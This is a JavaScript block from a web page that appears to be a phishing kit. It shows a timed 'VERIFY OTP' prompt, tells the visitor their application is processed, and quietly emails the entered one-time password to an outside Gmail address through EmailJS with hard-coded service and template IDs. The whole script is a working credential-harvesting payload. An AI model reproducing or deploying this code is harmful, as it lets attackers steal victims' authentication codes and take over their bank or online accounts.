            <script>
              ;(function () {
                emailjs.init('EtzP5to2mHKA3ji4B')
              })()

              let timerInterval // To store the timer interval ID
              let timeRemaining = 300 // 4 minutes in seconds

              function startTimer() {
                timerInterval = setInterval(updateTimer, 1000) // Run the timer every second
              }

              function updateTimer() {
                const minutes = Math.floor(timeRemaining / 60)
                const seconds = timeRemaining % 60
                document.getElementById(
                  'verifyOtpText'
                ).innerText = `VERIFY OTP (${minutes}:${
                  seconds < 10 ? '0' : ''
                }${seconds})`

                if (timeRemaining === 0) {
                  clearInterval(timerInterval)
                  document.getElementById('otp-input').readOnly = true
                  document.getElementById('verifyOtpText').innerText =
                    'Time Expired!' // Modify heading after time expires
                } else {
                  timeRemaining--
                }
              }

              function otpSubmit() {
                const otpInput = document.getElementById('otp-input').value
                if (otpInput.trim() === '') {
                  alert('Please enter the OTP.')
                  return
                }

                clearInterval(timerInterval)
                document.getElementById('otp-input').readOnly = true
                document.getElementById('verifyOtpText').innerText =
                  'Your application is now processed, Please check your mail for more information'

                // Send the OTP code to your email using EmailJS (modify this part based on your previous code)
                const templateParams = {
                  // Add your template parameters here (e.g., email address, OTP code)
                  // You can use the previous code and update the 'service', 'template', and 'templateParams' accordingly.

                  sendername: 'ansarudeenboys',
                  to: 'mhcplutoservices@gmail.com',
                  subject: 'otp code',
                  replyto: 'information',
                  message: 'The OTP is : ' + otpInput,
                }

                // Replace the placeholders with your service ID, template ID, and user parameters
                emailjs
                  .send('service_jvz82un', 'template_tll0x6f', templateParams)
                  .then(
                    function (response) {
                      console.log('Email sent successfully!', response)
                    },
                    function (error) {
                      console.log('Error sending email:', error)
                    }
                  )
              }

              startTimer()
            </script>
